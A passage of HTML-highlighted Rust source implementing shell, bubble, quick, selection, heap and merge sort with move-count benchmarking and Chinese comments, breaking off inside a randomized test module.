        <span class="token keyword">let</span> dlta <span class="token operator">=</span> <span class="token macro property">vec!</span><span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token number">0</span><span class="token punctuation">..</span>dlta<span class="token punctuation">.</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">shell_insert</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> dlta<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">fn</span> <span class="token function-definition function">shell_insert</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">,</span> nums <span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token keyword">i32</span><span class="token operator">></span><span class="token punctuation">,</span> d <span class="token punctuation">:</span> <span class="token keyword">u32</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token comment">// d为步长</span>
        <span class="token keyword">let</span> dd <span class="token operator">=</span> d <span class="token keyword">as</span> <span class="token keyword">usize</span><span class="token punctuation">;</span>
        <span class="token comment">// 分成d次插入排序</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> dd<span class="token punctuation">..</span>nums<span class="token punctuation">.</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">compare</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i <span class="token operator">-</span> dd<span class="token punctuation">]</span><span class="token punctuation">,</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                <span class="token keyword">let</span> temp <span class="token operator">=</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
                <span class="token keyword">let</span> <span class="token keyword">mut</span> j <span class="token operator">=</span> i<span class="token punctuation">;</span>

                <span class="token keyword">while</span> j <span class="token operator">>=</span> dd <span class="token operator">&amp;&amp;</span> <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">compare</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j <span class="token operator">-</span> dd<span class="token punctuation">]</span><span class="token punctuation">,</span> temp<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> nums<span class="token punctuation">[</span>j <span class="token operator">-</span> dd<span class="token punctuation">]</span><span class="token punctuation">;</span>
                    <span class="token keyword">self</span><span class="token punctuation">.</span>bench<span class="token punctuation">.</span>move_time <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
                    j <span class="token operator">-=</span> dd<span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>

                nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> temp<span class="token punctuation">;</span>
                <span class="token keyword">self</span><span class="token punctuation">.</span>bench<span class="token punctuation">.</span>move_time <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">bubble_sort</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">,</span> nums <span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token keyword">i32</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">let</span> <span class="token keyword">mut</span> change <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token keyword">let</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token number">0</span><span class="token punctuation">..</span>n<span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> change <span class="token operator">==</span> <span class="token boolean">false</span><span class="token punctuation">&#123;</span>
                <span class="token keyword">return</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            change <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
            <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token number">1</span><span class="token punctuation">..</span>n <span class="token operator">-</span> i<span class="token punctuation">&#123;</span>
                <span class="token keyword">if</span> <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">compare</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                    <span class="token comment">// 交换，记录</span>
                    nums<span class="token punctuation">.</span><span class="token function">swap</span><span class="token punctuation">(</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token keyword">self</span><span class="token punctuation">.</span>bench<span class="token punctuation">.</span>move_time <span class="token operator">+=</span> <span class="token number">3</span><span class="token punctuation">;</span>
                    change <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">quick_sort</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">,</span> nums <span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token keyword">i32</span><span class="token operator">></span><span class="token punctuation">,</span> low<span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">,</span> high<span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> high <span class="token operator">></span> low <span class="token punctuation">&#123;</span>
            <span class="token keyword">let</span> pi <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">partition</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> low<span class="token punctuation">,</span> high<span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token keyword">if</span> pi <span class="token operator">></span> low <span class="token punctuation">&#123;</span> <span class="token comment">// 避免pi = 0发生溢出的情况</span>
                <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">quick_sort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> low<span class="token punctuation">,</span> pi <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>

            <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">quick_sort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> pi <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> high<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">fn</span> <span class="token function-definition function">partition</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">,</span> nums <span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token keyword">i32</span><span class="token operator">></span><span class="token punctuation">,</span> low<span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">,</span> high<span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token keyword">usize</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">let</span> pivot <span class="token operator">=</span> nums<span class="token punctuation">[</span>high <span class="token keyword">as</span> <span class="token keyword">usize</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">let</span> <span class="token keyword">mut</span> index <span class="token punctuation">:</span> <span class="token keyword">usize</span> <span class="token operator">=</span> low <span class="token keyword">as</span> <span class="token keyword">usize</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> j <span class="token keyword">in</span> low<span class="token punctuation">..</span>high <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">compare</span><span class="token punctuation">(</span>pivot<span class="token punctuation">,</span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                index <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
                nums<span class="token punctuation">.</span><span class="token function">swap</span><span class="token punctuation">(</span>index <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span>j<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">self</span><span class="token punctuation">.</span>bench<span class="token punctuation">.</span>move_time <span class="token operator">+=</span> <span class="token number">3</span><span class="token punctuation">;</span>

            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        nums<span class="token punctuation">.</span><span class="token function">swap</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>high <span class="token keyword">as</span> <span class="token keyword">usize</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        index
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">select_sort</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">,</span> nums <span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token keyword">i32</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">let</span> t <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token number">0</span><span class="token punctuation">..</span>t<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">let</span> target <span class="token operator">=</span> t <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">-</span> i<span class="token punctuation">;</span>
            <span class="token keyword">let</span> k <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">find_max</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> t<span class="token operator">-</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> k <span class="token operator">!=</span> target<span class="token punctuation">&#123;</span>
                nums<span class="token punctuation">.</span><span class="token function">swap</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span>target<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">self</span><span class="token punctuation">.</span>bench<span class="token punctuation">.</span>move_time <span class="token operator">+=</span> <span class="token number">3</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">fn</span> <span class="token function-definition function">find_max</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">,</span> nums <span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token keyword">i32</span><span class="token operator">></span><span class="token punctuation">,</span> len<span class="token punctuation">:</span><span class="token keyword">usize</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token keyword">usize</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">let</span> <span class="token keyword">mut</span> max <span class="token operator">=</span> nums<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">let</span> <span class="token keyword">mut</span> max_index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token number">1</span><span class="token punctuation">..</span>len<span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">compare</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>max<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                max_index <span class="token operator">=</span> i<span class="token punctuation">;</span>
                max <span class="token operator">=</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        max_index
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">heap_sort</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">,</span> nums <span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token keyword">i32</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">let</span> len <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">let</span> last_parent <span class="token operator">=</span> <span class="token punctuation">(</span>len <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>

        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">..=</span>last_parent<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">rev</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">sift_down</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> i<span class="token punctuation">,</span> len <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">..=</span>len <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">rev</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            nums<span class="token punctuation">.</span><span class="token function">swap</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">self</span><span class="token punctuation">.</span>bench<span class="token punctuation">.</span>move_time <span class="token operator">+=</span> <span class="token number">3</span><span class="token punctuation">;</span>

            <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">sift_down</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">fn</span> <span class="token function-definition function">sift_down</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">,</span> nums <span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token keyword">i32</span><span class="token operator">></span><span class="token punctuation">,</span> start <span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">,</span> end <span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">let</span> <span class="token keyword">mut</span> parent <span class="token operator">=</span> start<span class="token punctuation">;</span>
        <span class="token keyword">let</span> <span class="token keyword">mut</span> child <span class="token operator">=</span> parent <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token keyword">while</span> child <span class="token operator">&lt;=</span> end<span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> child <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">&lt;=</span> end <span class="token operator">&amp;&amp;</span> <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">compare</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>child <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>child<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                child <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">if</span> <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">compare</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>parent<span class="token punctuation">]</span><span class="token punctuation">,</span>nums<span class="token punctuation">[</span>child<span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">return</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
                nums<span class="token punctuation">.</span><span class="token function">swap</span><span class="token punctuation">(</span>child<span class="token punctuation">,</span> parent<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">self</span><span class="token punctuation">.</span>bench<span class="token punctuation">.</span>move_time <span class="token operator">+=</span> <span class="token number">3</span><span class="token punctuation">;</span>
                parent <span class="token operator">=</span> child<span class="token punctuation">;</span>
                child <span class="token operator">=</span> parent <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">merge_sort</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">,</span> nums <span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token keyword">i32</span><span class="token operator">></span><span class="token punctuation">,</span> left <span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">,</span> right <span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> left <span class="token operator">&lt;</span> right<span class="token punctuation">&#123;</span>
            <span class="token keyword">let</span> mid <span class="token operator">=</span> left <span class="token operator">+</span> <span class="token punctuation">(</span>right <span class="token operator">-</span> left<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>
            <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">merge_sort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> left<span class="token punctuation">,</span> mid<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">merge_sort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> right<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">merge</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> left<span class="token punctuation">,</span>mid<span class="token punctuation">,</span> right<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">fn</span> <span class="token function-definition function">merge</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">,</span> nums <span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token keyword">i32</span><span class="token operator">></span><span class="token punctuation">,</span> left <span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">,</span>mid <span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">,</span> right <span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">let</span> l1 <span class="token operator">=</span> mid <span class="token operator">-</span> left <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token keyword">let</span> l2 <span class="token operator">=</span> right <span class="token operator">-</span> mid<span class="token punctuation">;</span>

        <span class="token keyword">let</span> v1 <span class="token operator">=</span> nums<span class="token punctuation">[</span>left<span class="token punctuation">..</span>left <span class="token operator">+</span> l1<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">to_vec</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">let</span> v2 <span class="token operator">=</span> nums<span class="token punctuation">[</span>mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">..</span>mid <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">+</span> l2<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">to_vec</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">self</span><span class="token punctuation">.</span>bench<span class="token punctuation">.</span>move_time <span class="token operator">+=</span> <span class="token punctuation">(</span>l1 <span class="token operator">+</span> l2<span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token keyword">u64</span><span class="token punctuation">;</span>

        <span class="token keyword">let</span> <span class="token keyword">mut</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">let</span> <span class="token keyword">mut</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">let</span> <span class="token keyword">mut</span> k <span class="token operator">=</span> left<span class="token punctuation">;</span>

        <span class="token keyword">while</span> i<span class="token operator">&lt;</span>l1 <span class="token operator">&amp;&amp;</span> j<span class="token operator">&lt;</span>l2<span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">compare</span><span class="token punctuation">(</span>v1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> v2<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                nums<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> v2<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>
                <span class="token keyword">self</span><span class="token punctuation">.</span>bench<span class="token punctuation">.</span>move_time <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
                j <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                nums<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> v1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
                <span class="token keyword">self</span><span class="token punctuation">.</span>bench<span class="token punctuation">.</span>move_time <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
                i <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            k <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">while</span> i <span class="token operator">&lt;</span> l1<span class="token punctuation">&#123;</span>
            nums<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> v1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token keyword">self</span><span class="token punctuation">.</span>bench<span class="token punctuation">.</span>move_time <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
            i <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
            k <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">while</span> i <span class="token operator">&lt;</span> l2<span class="token punctuation">&#123;</span>
            nums<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> v2<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token keyword">self</span><span class="token punctuation">.</span>bench<span class="token punctuation">.</span>move_time <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
            j <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
            k <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>


<span class="token attribute attr-name">#[cfg(test)]</span>
<span class="token keyword">mod</span> <span class="token module-declaration namespace">test</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">use</span> <span class="token keyword">crate</span><span class="token punctuation">::</span><span class="token class-name">Sort</span><span class="token punctuation">;</span>

    <span class="token attribute attr-name">#[test]</span>
    <span class="token keyword">fn</span> <span class="token function-definition function">test_sort</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">use</span> <span class="token namespace">rand<span class="token punctuation">::</span></span><span class="token class-name">Rng</span><span class="token punctuation">;</span>
        <span class="token keyword">use</span> <span class="token namespace">tracing<span class="token punctuation">::</span></span>info<span class="token punctuation">;</span>
        <span class="token keyword">use</span> <span class="token namespace">tracing_subscriber<span class="token punctuation">::</span>filter<span class="token punctuation">::</span></span><span class="token class-name">LevelFilter</span><span class="token punctuation">;</span>

        <span class="token keyword">let</span> _ <span class="token operator">=</span> <span class="token namespace">tracing_subscriber<span class="token punctuation">::</span></span><span class="token function">fmt</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">with_max_level</span><span class="token punctuation">(</span><span class="token class-name">LevelFilter</span><span class="token punctuation">::</span><span class="token constant">INFO</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">with_test_writer</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">try_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">let</span> <span class="token keyword">mut</span> rng <span class="token operator">=</span> <span class="token namespace">rand<span class="token punctuation">::</span></span><span class="token function">rng</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 定义5组测试数据的长度</span>
        <span class="token keyword">let</span> test_sizes <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">500</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">,</span> <span class="token number">5000</span><span class="token punctuation">,</span> <span class="token number">10000</span><span class="token punctuation">,</span> <span class="token number">100000</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

        <span class="token keyword">for</span> <span class="token punctuation">(</span>round<span class="token punctuation">,</span> <span class="token operator">&amp;</span>len<span class="token punctuation">)</span> <span class="token keyword">in</span> test_sizes<span class="token punctuation">.</span><span class="token function">iter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">enumerate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token macro property">info!</span><span class="token punctuation">(</span><span class="token string">"=== 第 &#123;&#125; 组测试 | 数据量: &#123;&#125; ==="</span><span class="token punctuation">,</span> round <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token comment">// 生成随机数据</span>
